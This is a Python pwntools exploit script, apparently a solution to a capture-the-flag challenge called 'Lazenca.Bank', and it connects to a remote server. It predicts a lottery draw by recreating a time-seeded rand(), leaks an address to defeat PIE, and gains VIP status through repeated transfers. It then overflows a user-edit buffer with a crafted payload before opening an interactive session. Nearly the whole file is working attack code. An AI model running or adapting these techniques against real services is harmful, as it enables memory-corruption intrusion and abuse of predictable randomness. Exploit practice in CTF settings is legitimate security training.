#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["./Lazenca.Bank"], api=True)
    else:
        return remote("35.200.24.227", 10002)


class Rng:
    # https://stackoverflow.com/a/26630526/3832536

    def __init__(self, seed):
        self.r = [seed] * 344
        for i in range(1, 31):
            self.r[i] = (16807 * self.r[i - 1]) % 2147483647
        for i in range(31, 34):
            self.r[i] = self.r[i - 31]
        for i in range(34, 344):
            self.r[i] = self.r[i - 31] + self.r[i - 3]
        self.n = 0

    def next(self):
        x = self.r[(self.n + 313) % 344] + self.r[(self.n + 341) % 344]
        self.r[self.n % 344] = x
        self.n = (self.n + 1) % 344
        return (x >> 1) & 0x7FFFFFFF


def win_lottery(tube):
    tube.sendlineafter("Input : ", "5")  # Lottery
    rng = Rng(int(time.time()))
    tube.recvuntil("Enter numbers:\n")
    seen = set()
    for i in range(7):
        while True:
            number = (rng.next() % 37) + 1
            if number not in seen:
                seen.add(number)
                break
        tube.sendlineafter(f"[{i + 1}] : ", str(number))
    tube.sendafter("Name : ", "_")
    tube.sendafter("Address : ", "_")
    tube.recvuntil("Address : _")
    (leaked_addr,) = struct.unpack(
        "<Q", (b"\x00" + tube.recvuntil("\n\n")[:-2]).ljust(8, b"\x00")
    )
    print(f"leaked_addr = 0x{leaked_addr:x}")
    pie = leaked_addr - 0x6000
    print(f"pie = 0x{pie:x}")
    return pie


def make_current_user_vip(tube):
    tube.sendlineafter("Input : ", "4")  # Loan
    tube.recvuntil("Account type : 1\n")
    tube.recvuntil("Account number : ")
    loan_account_number = int(tube.recvline())

    pie = win_lottery(tube)

    for _ in range(20):
        tube.sendlineafter("Input : ", "3")  # Transfer
        tube.sendlineafter("Enter the account number to be transfer.\n", str(loan_account_number))
        tube.sendlineafter("Enter the amount to be transfer.\n", "5")

    return pie, loan_account_number


def create_vip_user(tube, userid, password):
    tube.sendlineafter("Input : ", "6")  # Add User
    tube.sendlineafter("ID : ", userid)
    tube.sendlineafter("Password : ", password)

    tube.sendlineafter("Input : ", "7")  # Login
    tube.sendlineafter("ID : ", userid)
    tube.sendlineafter("Password : ", password)

    return make_current_user_vip(tube)


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.Breakpoint("alarm", temporary=True)
            tube.gdb.continue_and_wait()
            tube.gdb.execute("set $rdi = 9999")
            tube.gdb.continue_nowait()

        pie, loan_account_number = create_vip_user(tube, userid="foo", password="bar")
        tube.sendlineafter("Input : ", "7")  # User
        tube.sendafter("Input : ", "2 ")  # Edit
        tube.sendlineafter("Edit", (b"A" * 55) + struct.pack("<Q", 0x7777))
        tube.sendlineafter("Input : ", "0")  # Back
        tube.sendlineafter("Input : ", "8")  # VIP
        tube.sendlineafter("Enter the account number to be transfer.\n", str(loan_account_number))
        tube.sendlineafter("Enter the amount to be transfer.\n", "1")

        # tube.sendlineafter("Input : ", "9")  # Logout
        # create_vip_user(tube, userid="baz", password="quux")
        tube.interactive()


if __name__ == "__main__":
    main()
